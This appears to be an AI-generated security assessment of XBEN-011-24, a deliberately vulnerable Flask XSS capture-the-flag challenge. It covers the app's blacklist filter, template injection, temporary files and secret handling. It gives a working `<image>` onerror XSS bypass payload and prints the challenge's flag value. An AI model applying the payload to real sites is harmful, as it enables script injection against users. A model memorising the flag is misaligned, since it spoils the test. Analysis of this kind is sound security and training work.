# Penetration Test Scope & Boundaries

**Primary Directive:** Your analysis is strictly limited to the **network-accessible attack surface** of the application. All subsequent tasks must adhere to this scope. Before reporting any finding (e.g., an entry point, a vulnerability sink), you must first verify it meets the "In-Scope" criteria.

### In-Scope: Network-Reachable Components
A component is considered **in-scope** if its execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:
- Publicly exposed web pages and API endpoints.
- Endpoints requiring authentication via the application's standard login mechanisms.
- Any developer utility, debug console, or script that has been mistakenly exposed through a route or is otherwise callable from other in-scope, network-reachable code.

### Out-of-Scope: Locally Executable Only
A component is **out-of-scope** if it **cannot** be invoked through the running application's network interface and requires an execution context completely external to the application's request-response cycle. This includes tools that must be run via:
- A command-line interface (e.g., `go run ./cmd/...`, `python scripts/...`).
- A development environment's internal tooling (e.g., a "run script" button in an IDE).
- CI/CD pipeline scripts or build tools (e.g., Dagger build definitions).
- Database migration scripts, backup tools, or maintenance utilities.
- Local development servers, test harnesses, or debugging utilities.
- Static files or scripts that require manual opening in a browser (not served by the application).

---

## 1. Executive Summary

XBEN-011-24 is a deliberately vulnerable Flask-based web application designed as a Cross-Site Scripting (XSS) Capture The Flag (CTF) challenge. The application presents a **CRITICAL security posture** characterized by the complete absence of defense-in-depth security controls, running on end-of-life infrastructure (Python 2.7.18, deprecated in 2020), and utilizing a discontinued headless browser engine (PhantomJS 2.1.1, archived in 2018). The application's attack surface is intentionally minimal yet maximally exploitable—consisting of two primary HTTP endpoints (`/` and `/page`) where the `/page` endpoint accepts user input through a POST parameter (`solution`) and implements only a trivially bypassable blacklist filter that allows `<image>` tags while blocking other HTML elements.

From a penetration testing perspective, this application represents a **high-value target with multiple cascading vulnerabilities**. The primary attack vector is a reflected XSS vulnerability achieved through server-side template injection using Python's `.format()` method, which directly embeds unsanitized user input into HTML responses without proper context-aware output encoding. The security implications extend beyond the intentional XSS challenge: the application exposes the CTF flag through multiple channels including plaintext environment variables, unencrypted file storage, container stdout logs, and successful XSS exploitation responses. The absence of authentication, authorization, session management, CSRF protection, rate limiting, security headers (CSP, X-Frame-Options, HSTS), and HTTPS/TLS encryption creates an environment where an external attacker can freely exploit the XSS vulnerability, exfiltrate the flag, and potentially pivot to container-level attacks. Debug mode is enabled (`debug=True`), exposing detailed stack traces and enabling the Werkzeug interactive debugger, which could provide remote code execution capabilities if accessible. The application architecture—while simple—demonstrates critical security anti-patterns that are instructive for penetration testing training: blacklist-based input validation, template injection vulnerabilities, insecure secret management, inadequate logging practices that leak sensitive data, and the risks of running unmaintained software dependencies with known CVEs.

**Key Attack Surfaces Identified:** (1) Reflected XSS via `/page` endpoint with bypassable `<image>` tag filter; (2) Flag exposure through multiple storage mechanisms accessible post-exploitation; (3) Debug mode potentially enabling Werkzeug debugger RCE; (4) Complete lack of security middleware creating zero friction for exploitation; (5) PhantomJS subprocess execution using hardcoded localhost URLs (not exploitable for SSRF but relevant for understanding validation flow).

---

## 2. Architecture & Technology Stack

### Framework & Language

**Primary Stack:** Python 2.7.18 (End-of-Life) + Flask 1.1.4 + PhantomJS 2.1.1

The application is built on a **critically outdated and unsupported technology foundation** that presents severe security implications for penetration testing assessment. Python 2.7.18 reached its official end-of-life on January 1, 2020, meaning no security patches, bug fixes, or vulnerability disclosures have been addressed for over four years. Flask 1.1.4, released in May 2021, is similarly outdated with multiple known CVEs in subsequent releases (current stable is Flask 3.x). The application's dependency file (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/requirements.txt`) lists only two packages: `Flask==1.1.4` and `phantomjs`, with no pinned versions for transitive dependencies like Werkzeug, Jinja2, Click, or ItsDangerous—all of which have had security updates since 2021.

**Security Implications:** The use of Python 2.7 is particularly concerning because modern exploitation techniques, buffer overflow protections, and cryptographic improvements introduced in Python 3.x are completely absent. The application imports but never properly utilizes Flask's built-in security features (no `SECRET_KEY` configured, no session management, no CSRF protection via Flask-WTF). Flask's `PROPAGATE_EXCEPTIONS = True` configuration (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:25`) ensures that all exceptions bubble up to the HTTP response layer, potentially leaking stack traces and internal application state to attackers. The most critical architectural decision is the reliance on PhantomJS 2.1.1, a headless WebKit browser that was officially **discontinued and archived in 2018** due to lack of maintainership and the emergence of superior alternatives like Puppeteer and Playwright. PhantomJS uses an outdated WebKit engine from 2016 with **hundreds of known CVEs** including arbitrary code execution, sandbox escapes, and memory corruption vulnerabilities (CVE-2016-4657, CVE-2016-4666, CVE-2016-4677, among many others).

### Architectural Pattern

**Pattern:** Monolithic, stateless web application with synchronous subprocess execution

The application follows a **simple request-response monolith** deployed in a single Docker container without microservices, message queues, or distributed components. The architecture can be described as a three-layer XSS validation pipeline: (1) Flask receives user input via HTTP POST to `/page`; (2) Python applies regex-based filtering and injects content into an HTML template; (3) A subprocess spawns PhantomJS to load the generated HTML from a temporary file and validate whether the XSS payload successfully triggered JavaScript execution. This synchronous architecture creates a **5-second blocking window** per request (enforced by the `timeout 5` command wrapping PhantomJS at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:34`) during which the Flask worker is occupied—this could be exploited for denial-of-service attacks by submitting multiple concurrent requests to exhaust worker threads.

**Trust Boundary Analysis:** The application has essentially **no trust boundaries** because it implements zero authentication or authorization controls. Every endpoint is publicly accessible, and all user input is implicitly trusted after minimal filtering. The critical trust boundary violation occurs at the template injection point (`app.py:71-75`) where user input crosses from the HTTP request context into the HTML rendering context without proper sanitization. The PhantomJS subprocess execution represents an interesting pseudo-boundary: user input influences the HTML content processed by PhantomJS but cannot control the URL due to hardcoded `localhost:5000` values. However, the absence of Content Security Policy means successful XSS in the PhantomJS context can execute arbitrary JavaScript, potentially exfiltrating data or attacking the container's internal network if additional services were present (though none exist in this minimal CTF deployment).

### Critical Security Components

**Component Inventory:** Flask application server (`app.py`), PhantomJS validation engine (`check.js`), HTML template constants (`constants.py`), static file server (Flask default), Docker containerization with `python:2.7.18-slim` base image.

The most **security-critical component** is the XSS validation flow implemented in the `check_result()` function at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:33-51`. This function orchestrates the subprocess execution of PhantomJS using `subprocess.Popen()` with a properly constructed argument list (not vulnerable to command injection) but introduces a **race condition vulnerability** through temporary file handling. The process creates a randomly-named HTML file in the `static/` directory (line 35: `fn = "static/" + os.urandom(16).encode('hex') + '.html'`), writes user-controlled HTML content to it, passes the URL to PhantomJS via stdin, and then deletes the file in a `finally` block. During the brief window between file creation and deletion (up to 5 seconds due to PhantomJS timeout), the file is **publicly accessible** via HTTP at `http://target:5000/static/<random>.html`. An attacker who can predict or brute-force the random filename could access the temporary file directly, bypassing the XSS validation logic entirely and potentially causing unexpected behavior.

**PhantomJS Security Architecture:** The PhantomJS validation script at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/check.js` implements a custom XSS detection mechanism by overriding `window.alert()`, `window.confirm()`, and `window.prompt()` to capture dialog outputs (lines 9-16). The script expects the XSS payload to trigger one of these functions with the exact string "XSS" to validate success. This creates an interesting constraint for exploitation: payloads must not only bypass the HTML tag blacklist but also execute JavaScript that calls `alert('XSS')`, `confirm('XSS')`, or `prompt('XSS')`. The PhantomJS page is configured with `page.onError` and `page.onConsoleMessage` handlers (lines 28-42) that log errors and console output, but critically, these logs are **not** forwarded back to the Flask application—they're lost in PhantomJS's stdout. The application only reads the first line of PhantomJS output (`proc.stdout.readline().strip()` at line 45), which should be "XSS" on success or something else on failure.

**Security Component Gaps:** The application completely lacks industry-standard security middleware that would typically exist in a defense-in-depth architecture: no Web Application Firewall (WAF), no intrusion detection, no rate limiting (Flask-Limiter), no input validation framework (Cerberus, Marshmallow), no CSRF protection (Flask-WTF), no CORS configuration (Flask-CORS), no security headers middleware (Flask-Talisman), no authentication decorators (Flask-Login), no authorization framework (Flask-Principal), and no automated vulnerability scanning hooks. The Flask application is created with minimal configuration at line 24 (`app = Flask(__name__)`) without setting `SESSION_COOKIE_HTTPONLY`, `SESSION_COOKIE_SECURE`, `SESSION_COOKIE_SAMESITE`, or `SECRET_KEY`—all security best practices even for challenge applications. The Docker deployment exposes port 5000 without TLS termination, meaning all traffic is transmitted over unencrypted HTTP, allowing network-level attackers to intercept credentials, session tokens (if they existed), and flag values transmitted in responses.

---

## 3. Authentication & Authorization Deep Dive

### Authentication Mechanisms

**Status: NONE IMPLEMENTED**

The XBEN-011-24 application has **ZERO authentication functionality** of any kind. No login endpoints, no registration flows, no password reset mechanisms, no API key validation, no bearer token authentication, no OAuth/OIDC integration, no SAML support, and no multi-factor authentication exist anywhere in the codebase. This is a deliberate design choice for a CTF challenge where the focus is solely on XSS exploitation, but it represents a **critical security gap** from an enterprise penetration testing perspective.

**Complete Endpoint Authentication Analysis:**

1. **Route: `GET /`** (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:29-31`)
   - **Handler:** `index()`
   - **Authentication:** None (publicly accessible)
   - **Authorization:** None
   - **Functionality:** Returns static HTML landing page stored in `INDEX_CONTENT` constant
   - **Security Risk:** Information disclosure—reveals challenge structure and instructions

2. **Route: `GET/POST /page`** (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:65-75`)
   - **Handler:** `page_handler()`
   - **Authentication:** None (publicly accessible)
   - **Authorization:** None
   - **Functionality:** XSS challenge submission and validation endpoint
   - **Input Parameter:** `request.form.get('solution','')` (POST form data)
   - **Security Risk:** CRITICAL—direct attack vector for XSS exploitation with flag exposure

3. **Route: `GET /static/*`** (Flask built-in static file handler)
   - **Handler:** Flask `send_from_directory()` (implicit)
   - **Authentication:** None (publicly accessible)
   - **Authorization:** None
   - **Functionality:** Serves CSS, images, fonts from `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/static/`
   - **Security Risk:** Directory listing potentially enabled (Flask default), temporary XSS validation HTML files accessible during 5-second window

**Exploitation Implications:** The absence of authentication means an external attacker can immediately begin XSS exploitation attempts without any credential acquisition, session hijacking, or privilege escalation phases. There are no authentication bypass techniques required because authentication does not exist. The CTF flag is protected solely by the XSS challenge mechanics—once the blacklist filter is bypassed, the flag is immediately returned in the HTTP response at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:56` (success case: `data = '<div class="solution-text">... Here is the flag: {1}</div>'.format(..., flag)`). This creates a **single-step exploitation path**: bypass filter → receive flag, with no additional authentication hurdles.

### Session Management and Token Security

**Status: COMPLETELY ABSENT**

The application implements **NO session management whatsoever**. There are no session cookies, no server-side session storage (Redis, Memcached, database), no client-side JWT tokens, no bearer tokens, and no state tracking between requests. Flask's built-in session management system is imported but never initialized because no `SECRET_KEY` is configured.

**Cookie Security Configuration Analysis:**

File: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:24-25`

```python
app = Flask(__name__)
app.config['PROPAGATE_EXCEPTIONS'] = True
```

**Missing Critical Flask Session Configurations:**
- `SECRET_KEY` → **NOT SET** (prevents Flask session usage entirely)
- `SESSION_COOKIE_HTTPONLY` → **NOT SET** (defaults to `True` in Flask, but irrelevant since no sessions exist)
- `SESSION_COOKIE_SECURE` → **NOT SET** (should be `True` to prevent cookie transmission over HTTP)
- `SESSION_COOKIE_SAMESITE` → **NOT SET** (defaults to `None` in Flask <2.1, should be `Lax` or `Strict`)
- `SESSION_COOKIE_NAME` → **NOT SET** (defaults to `session`)
- `PERMANENT_SESSION_LIFETIME` → **NOT SET** (defaults to 31 days)

**Exact Location Where Session Cookies SHOULD Be Configured:**

No session cookie configuration exists anywhere in the codebase. The Flask `make_response` function is imported at line 3 (`from flask import Flask, request, Response, make_response, url_for`) but is **never used**—a code smell indicating incomplete or removed functionality. Proper session cookie configuration would require:

```python
# Should exist at app.py:25-30 but DOES NOT
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(32))
app.config['SESSION_COOKIE_HTTPONLY'] = True  # Prevent JavaScript access
app.config['SESSION_COOKIE_SECURE'] = True    # HTTPS-only transmission
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax' # CSRF protection
```

**Security Implications for Penetration Testing:** The absence of session management means there are no session fixation, session hijacking, or cookie poisoning attack vectors. However, it also means the application has **no state awareness**—it cannot track user actions, implement rate limiting per user, or detect anomalous behavior patterns. If this were a production application, the lack of `HttpOnly` flags would allow XSS payloads to exfiltrate session tokens via `document.cookie`, but since no cookies exist, the XSS exploitation focuses purely on flag exfiltration and potential secondary objectives like container escape or internal network reconnaissance.

### Authorization Model and Bypass Scenarios

**Status: NO AUTHORIZATION CONTROLS**

The application implements **ZERO authorization mechanisms**. There is no Role-Based Access Control (RBAC), no Attribute-Based Access Control (ABAC), no permission checking middleware, no resource-level access controls, and no multi-tenant isolation. Every HTTP endpoint is accessible to every client without restriction.

**Missing Authorization Patterns:**
- **Decorator-based authorization:** No `@requires_auth`, `@admin_required`, or `@permission_required` decorators on routes
- **Middleware authorization:** No `@app.before_request` hooks performing permission checks
- **Resource ownership validation:** No verification that users can only access their own data (not applicable—no user concept exists)
- **API endpoint protection:** No differentiation between public and privileged operations

**Privilege Escalation Analysis:** Since no privilege levels exist (no admin vs. user distinction), there are **no privilege escalation vulnerabilities** in the traditional sense. However, from a CTF perspective, the "privilege escalation" occurs when an attacker successfully bypasses the XSS filter to gain access to the flag—this represents escalation from anonymous web visitor to flag holder. The authorization bypass is the XSS exploit itself.

### SSO/OAuth/OIDC Flows

**Status: NOT IMPLEMENTED**

The application has **NO Single Sign-On, OAuth, or OpenID Connect integration**. No callback endpoints, no state parameter validation, no nonce parameter validation, no authorization code exchange, no token introspection, and no JWKS (JSON Web Key Set) fetching exist in the codebase.

**Search Results for OAuth/SSO Keywords:**
- Searched for `oauth`, `client_id`, `client_secret`, `authorization_code`, `redirect_uri`, `access_token`, `refresh_token`, `id_token`, `jwt`, `jwks`, `oidc`, `saml`, `state`, `nonce` → **ZERO results**

This is expected for a CTF challenge application but would represent a significant architectural limitation in enterprise environments where federated authentication is standard.

### Multi-Tenancy Security Implementation

**Status: NOT APPLICABLE**

The application has no multi-tenancy features. There are no tenants, no tenant isolation, no tenant-specific data, and no tenant-based routing or access controls.

---

## 4. Data Security & Storage

### Database Security

**Status: NO DATABASE PRESENT**

The XBEN-011-24 application does **NOT use any database system**. No SQL databases (MySQL, PostgreSQL, SQLite), NoSQL databases (MongoDB, Redis, Cassandra), in-memory databases, or ORM frameworks (SQLAlchemy, Django ORM, Peewee) are present in the codebase. All data is ephemeral and stored in-memory during request processing or in temporary files on the filesystem.

**Evidence of Database Absence:**
- **Requirements file:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/requirements.txt` contains only `Flask==1.1.4` and `phantomjs`—no database drivers
- **Import analysis:** No database-related imports (`sqlite3`, `pymongo`, `psycopg2`, `mysqlclient`, `sqlalchemy`, etc.)
- **Connection string search:** No database connection strings, no `DATABASE_URL`, no connection pooling configuration
- **Migration files:** No Alembic, Flask-Migrate, or database migration scripts

**Security Implications:** The absence of a database eliminates entire categories of vulnerabilities including SQL injection, NoSQL injection, database authentication bypass, unencrypted data at rest in databases, database privilege escalation, and database-level command injection. However, it also means the application has **no persistent state**—the CTF flag must be loaded from a file at startup (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:22: flags = open('secret.txt').read().split()`) and remains in memory for the lifetime of the Flask process.

### Data Flow Security

**Primary Data Flow:** User Input → Blacklist Filter → Template Injection → Temporary File → PhantomJS Validation → Response with Flag (if successful)

**Detailed Data Flow Analysis:**

**Stage 1: Input Acquisition** (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:67`)
```python
msg = request.form.get('solution','')
```
User input arrives via POST form data parameter `solution`. No input length limits, no content-type validation, no origin checking, and no rate limiting at this stage.

**Stage 2: Blacklist Filtering** (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:68-70`)
```python
blacklist = r'<(?!image\b)[^>]+>'  # Block all tags except <image>
msg = re.sub(blacklist, '', msg, flags=re.IGNORECASE | re.DOTALL)
msg = re.sub(r'\s', '', msg, flags=re.IGNORECASE | re.DOTALL)  # Remove whitespace
```
**Critical Security Flaw:** Blacklist-based filtering is fundamentally bypassable. The regex allows `<image>` tags specifically, enabling XSS via `<image src=x onerror=alert('XSS')>`. The whitespace removal can be circumvented using HTML entities, encoded characters, or browser quirks. No whitelist validation, no CSP enforcement, and no output encoding occur.

**Stage 3: Template Injection** (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:71-73`)
```python
value = "" if msg == "" else '{0}'.format(msg)
data = CONTENT_TAG_POST.format("24", "Star", value, "", "")
```
User input is directly inserted into HTML template using Python's `.format()` without escaping. The `CONTENT_TAG_POST` template at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/constants.py:119` contains placeholder `{2}` that receives unsanitized user input.

**Stage 4: Temporary File Creation** (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:35-40`)
```python
fn = "static/" + os.urandom(16).encode('hex') + '.html'
of = open(fn, 'w')
of.write(page)
of.close()
```
**Security Issue:** Temporary files are created in the publicly-accessible `static/` directory with random names. While `os.urandom(16)` provides cryptographically strong randomness (2^128 possible filenames), the files remain accessible via HTTP during the 5-second PhantomJS execution window. An attacker conducting a timing attack could potentially access these files directly at `http://target:5000/static/<random>.html`.

**Stage 5: PhantomJS Validation** (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:34-45`)
PhantomJS loads the temporary HTML file from `http://localhost:5000/static/<random>.html` and executes any JavaScript present. If the payload successfully calls `alert('XSS')`, `confirm('XSS')`, or `prompt('XSS')`, the validation succeeds.

**Stage 6: Response Generation** (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:75`)
```python
return CONTENT_TAG_POST.format("24", "Star", value, result, "")
```
The user's input is **reflected back in the HTTP response** along with the validation result. On successful XSS, the response includes the flag value from `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:56`.

**Sensitive Data Paths and Protection Mechanisms:**

**Path 1: Flag Storage** → **INSECURE**
- **Source:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/.env:1` → `FLAG="flag{77b2f057-5e03-472b-bd38-10297eb53229}"`
- **Build-time injection:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/Dockerfile:24-26` → `ARG FLAG` → `RUN sed -i s/@FLAG@/$FLAG/g secret.txt`
- **Runtime storage:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/secret.txt` → Plaintext file containing flag
- **Application access:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:22` → `flags = open('secret.txt').read().split()`
- **Protection:** **NONE** (stored in plaintext, no encryption, visible in Docker image layers, accessible via container filesystem access)

**Path 2: Flag Logging** → **CRITICAL INFORMATION DISCLOSURE**
- **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:41-42`
```python
print "Page:"
print page  # ← Logs full HTML page content including flag to stdout
```
- **Security Impact:** The entire HTML page (which includes the flag in successful responses) is logged to container stdout, accessible via `docker logs <container_id>` by anyone with Docker access
- **Protection:** **NONE** (no log sanitization, no redaction of sensitive data)

**Path 3: Flag Transmission** → **INSECURE**
- **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:56`
```python
data = '<div class="solution-text">... Here is the flag: {1}</div>'.format(..., flag)
```
- **Transmission:** Unencrypted HTTP response (no HTTPS/TLS)
- **Protection:** **NONE** (flag transmitted in plaintext over the network, vulnerable to eavesdropping via network sniffing, ARP spoofing, or man-in-the-middle attacks)

### Multi-Tenant Data Isolation

**Status: NOT APPLICABLE**

The application has no multi-tenancy features. There are no tenants, no tenant-specific data segregation, no row-level security, no schema isolation, and no tenant-based access controls.

### Encryption and Secret Management

**Encryption Status: COMPLETELY ABSENT**

The application implements **ZERO encryption** of any kind:

- **No encryption at rest:** Flag stored in plaintext in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/secret.txt`
- **No encryption in transit:** Application runs HTTP-only on port 5000 without TLS/SSL termination
- **No cryptographic libraries:** No `cryptography`, `pycrypto`, `hashlib`, `hmac`, `secrets` module usage for cryptographic operations
- **No password hashing:** No authentication system means no password hashing (bcrypt, scrypt, Argon2)
- **No key management:** No secret rotation, no key derivation functions, no hardware security modules

**Secret Management Analysis:**

**Dockerfile Secret Injection** (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/Dockerfile:24-26`):
```dockerfile
ARG FLAG
RUN sed -i s/@FLAG@/$FLAG/g secret.txt
```
**CRITICAL VULNERABILITY:** This approach embeds the flag directly into the Docker image layer. Even if the file is deleted in a subsequent layer, the flag remains accessible by examining the image history with `docker history <image_id>` or by extracting the specific layer. This is a **catastrophic secret management failure** because Docker images are often pushed to registries (Docker Hub, private registries) where anyone with pull access can extract secrets from image layers.

**Environment Variable Storage** (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/.env:1`):
```
FLAG="flag{77b2f057-5e03-472b-bd38-10297eb53229}"
```
Environment variables are marginally better than hardcoded secrets but still problematic because they're visible via `docker inspect <container_id>`, process listings (`ps aux | grep FLAG`), and container environment dumps. Modern secret management would use HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, or Kubernetes Secrets with encryption at rest.

**Hardcoded Flag Reference** (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:22`):
```python
flags = open('secret.txt').read().split()
```
Reading secrets from files at startup is acceptable for CTF challenges but violates production security principles. No secret rotation mechanism exists—changing the flag requires rebuilding the Docker image.

---

## 5. Attack Surface Analysis

### External Entry Points

The XBEN-011-24 application exposes a **minimal attack surface** consisting of three primary entry points, all of which are network-accessible via HTTP on port 5000 (exposed through Docker Compose configuration at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/docker-compose.yml:8`).

#### **Entry Point 1: Index/Landing Page**

- **Route:** `GET /`
- **HTTP Methods:** GET
- **Handler Function:** `index()` at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:29-31`
- **Authentication Required:** None (publicly accessible)
- **Input Vectors:** None (no user input accepted)
- **Functionality:** Returns static HTML landing page stored in `INDEX_CONTENT` constant from `constants.py`

**Code Analysis:**
```python
@app.route('/')
def index():
    return INDEX_CONTENT
```

**Security Assessment:**
- **Information Disclosure:** The landing page likely reveals challenge instructions, hints about the XSS vulnerability, and application structure
- **Attack Vector Potential:** LOW—no user input, purely informational endpoint
- **Reconnaissance Value:** HIGH—provides attacker with challenge context and target understanding
- **Exploitability:** None directly, but guides exploitation strategy for `/page` endpoint

#### **Entry Point 2: XSS Challenge Submission Endpoint (PRIMARY ATTACK VECTOR)**

- **Route:** `GET/POST /page`
- **HTTP Methods:** GET, POST
- **Handler Function:** `page_handler()` at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:65-75`
- **Authentication Required:** None (publicly accessible)
- **Input Vectors:** POST form parameter `solution` (user-controlled XSS payload)
- **Functionality:** Accepts XSS payload, applies blacklist filter, validates via PhantomJS, returns success/failure with potential flag disclosure

**Code Analysis:**
```python
@app.route('/page', methods=['POST', 'GET'])
def page_handler():
    msg = request.form.get('solution','')  # ← USER INPUT ENTRY POINT
    blacklist = r'<(?!image\b)[^>]+>'      # ← BYPASSABLE FILTER
    msg = re.sub(blacklist, '', msg, flags=re.IGNORECASE | re.DOTALL)
    msg = re.sub(r'\s', '', msg, flags=re.IGNORECASE | re.DOTALL)
    value =  "" if msg == "" else '{0}'.format(msg)
    data = CONTENT_TAG_POST.format("24", "Star", value, "", "")  # ← TEMPLATE INJECTION
    result = check_result(data,flags[0],msg,'level_medium')      # ← PHANTOMJS VALIDATION
    return CONTENT_TAG_POST.format("24", "Star", value, result, "")  # ← REFLECTED XSS
```

**Security Assessment:**
- **Vulnerability Type:** Reflected XSS via server-side template injection
- **Attack Vector:** POST parameter `solution` accepts arbitrary HTML/JavaScript (with weak filtering)
- **Input Validation:** Blacklist-based regex filter allowing `<image>` tags with event handlers
- **Output Encoding:** NONE—user input reflected in HTML response without escaping
- **CSRF Protection:** NONE—no CSRF tokens, no origin validation, no SameSite cookie protection
- **Rate Limiting:** NONE—unlimited submission attempts possible
- **Flag Disclosure:** On successful XSS bypass, response includes CTF flag at line 56
- **Exploitability:** CRITICAL—primary objective of the CTF challenge

**Input Parameter Details:**
- **Name:** `solution`
- **Type:** String (form-encoded POST data)
- **Source:** `request.form.get('solution','')`
- **Default:** Empty string `''`
- **Maximum Length:** UNLIMITED (no length validation)
- **Content-Type:** `application/x-www-form-urlencoded` (assumed, not enforced)
- **Special Characters:** Not escaped or validated beyond blacklist regex

**Validation Bypass Techniques:**
1. **Event Handler Injection:** `<image src=x onerror=alert('XSS')>` (allowed because `<image>` tag is whitelisted)
2. **Whitespace Bypass:** Whitespace removal can be circumvented using HTML entities (`&#32;`, `&Tab;`), though testing required
3. **Case Manipulation:** Regex uses `re.IGNORECASE` so case variations won't help
4. **Encoding Attacks:** URL encoding, HTML entity encoding, Unicode normalization
5. **Browser Quirks:** Leveraging browser-specific HTML parsing behaviors

**PhantomJS Validation Flow:**
The `check_result()` function at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:33-51` orchestrates XSS detection:
1. Spawns PhantomJS subprocess with 5-second timeout
2. Creates temporary HTML file in `static/` directory with random name
3. Writes user-controlled HTML content to file
4. Passes URL `http://localhost:5000/static/<random>.html` to PhantomJS via stdin
5. PhantomJS loads page and monitors for `alert()`, `confirm()`, or `prompt()` calls with value "XSS"
6. Deletes temporary file in `finally` block
7. Returns "XSS" on success or PhantomJS output on failure

**Attack Surface Expansion via Temporary Files:**
- **File Path:** `static/<random>.html` where `<random>` is 32 hex characters from `os.urandom(16).encode('hex')`
- **Accessibility Window:** Up to 5 seconds (PhantomJS timeout)
- **URL Pattern:** `http://target:5000/static/[0-9a-f]{32}.html`
- **Race Condition:** Attacker could brute-force or time prediction to access temporary files directly
- **Search Space:** 2^128 possibilities (computationally infeasible to brute-force)

#### **Entry Point 3: Static File Server**

- **Route:** `GET /static/*`
- **HTTP Methods:** GET
- **Handler:** Flask built-in `send_from_directory()` (implicit)
- **Authentication Required:** None (publicly accessible)
- **Input Vectors:** URL path parameter (file path traversal potential)
- **Functionality:** Serves CSS, images, fonts, and other static assets

**Security Assessment:**
- **Directory Traversal:** Flask's `send_from_directory()` is generally safe against path traversal, but misconfigurations can occur
- **Information Disclosure:** Reveals application structure, file naming conventions, potential comments in CSS files
- **Temporary File Exposure:** During XSS validation, temporary HTML files exist in `static/` directory for up to 5 seconds
- **Directory Listing:** Potentially enabled if Flask debug mode interacts with static file serving (needs verification)

**Static Assets Inventory:**
- **CSS Files:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/static/css/style.css`, `/static/css/xss/*.css`
- **Images:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/static/img/*.png`, `/static/img/cookies/*.png`
- **Fonts:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/static/css/fonts/*`
- **Favicon:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/static/assets/fav-icon.png`

### Internal Service Communication

**Status: NO INTERNAL SERVICES**

The application is a **single-container monolith** with no microservices, no message queues, no inter-service communication, and no API gateways. The only "internal" communication is between the Flask application and the PhantomJS subprocess on the same container.

**PhantomJS Subprocess Communication:**
- **Mechanism:** `subprocess.Popen()` with `stdin`/`stdout` pipes at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:34`
- **Command:** `["timeout","5","phantomjs", "check.js"]`
- **Input:** URL string passed via stdin (line 43: `proc.stdin.write(url)`)
- **Output:** Single line read from stdout (line 45: `result = proc.stdout.readline().strip()`)
- **Trust Model:** Flask trusts PhantomJS output implicitly (no validation that output is "XSS" vs. something else)

**Security Implications:**
- **No Command Injection:** Subprocess uses array syntax (not `shell=True`) so no shell metacharacter injection possible
- **No SSRF:** URL is hardcoded to `localhost:5000` with random filename (user cannot control URL)
- **Process Isolation:** PhantomJS runs in same container but as separate process (no privilege separation)
- **Timeout Protection:** 5-second timeout prevents indefinite hangs

**HTTP Loopback Communication:**
PhantomJS connects to `http://localhost:5000/static/<random>.html` to load the temporary file. This creates a loopback HTTP request from PhantomJS to the Flask application within the same container. If the Flask application had additional endpoints, PhantomJS could potentially be exploited to make requests to them (a form of SSRF), but since only `/`, `/page`, and `/static/*` exist and PhantomJS uses a hardcoded URL pattern, this is not exploitable.

### Input Validation Patterns

**Primary Validation Mechanism: BLACKLIST REGEX FILTER (FUNDAMENTALLY FLAWED)**

**Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-011-24/src/app.py:68-70`

```python
blacklist = r'<(?!image\b)[^>]+>'  # blacklist any tag except <image>
msg = re.sub(blacklist, '', msg, flags=re.IGNORECASE | re.DOTALL)
msg = re.sub(r'\s', '', msg, flags=re.IGNORECASE | re.DOTALL) # Remove whitespaces
```

**Regex Breakdown:**

1. **First Regex:** `<(?!image\b)[^>]+>`
   - `<` — Matches opening angle bracket
   - `(?!image\b)` — Negative lookahead: fails if next characters are "image" followed by word boundary
   - `[^>]+` — Matches one or more non-`>` characters (tag name and attributes)
   - `>` — Matches closing angle bracket
   - **Effect:** Removes all HTML tags EXCEPT those starting with `<image`
